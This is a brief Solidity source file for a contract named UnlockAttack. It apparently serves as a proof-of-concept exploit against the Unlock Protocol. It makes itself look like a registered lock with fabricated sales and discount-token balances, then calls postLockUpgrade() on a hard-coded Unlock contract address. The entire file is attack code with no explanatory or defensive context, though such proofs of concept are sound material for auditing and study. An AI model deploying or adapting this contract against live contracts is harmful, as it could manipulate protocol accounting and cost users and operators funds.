// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './interfaces/IUnlock.sol';

contract UnlockAttack {

  address public unlockProtocol;

  
  uint constant publicLockVersion = 13;
  address constant tokenAddress = address(0);
  address constant public newUnlock = 0xe79B93f8E22676774F2A8dAd469175ebd00029FA;

  struct LockBalances {
    bool deployed;
    uint totalSales; // This is in wei
    uint yieldedDiscountTokens;
  }

  mapping(address => LockBalances) public locks;



  constructor() { 
    unlockProtocol = address(this);

    locks[address(this)] = LockBalances ({
      deployed: true,
      totalSales: 1000000,
      yieldedDiscountTokens: 1000000
    });
  }

  function setup() public {
    IUnlock(newUnlock).postLockUpgrade();
  }
}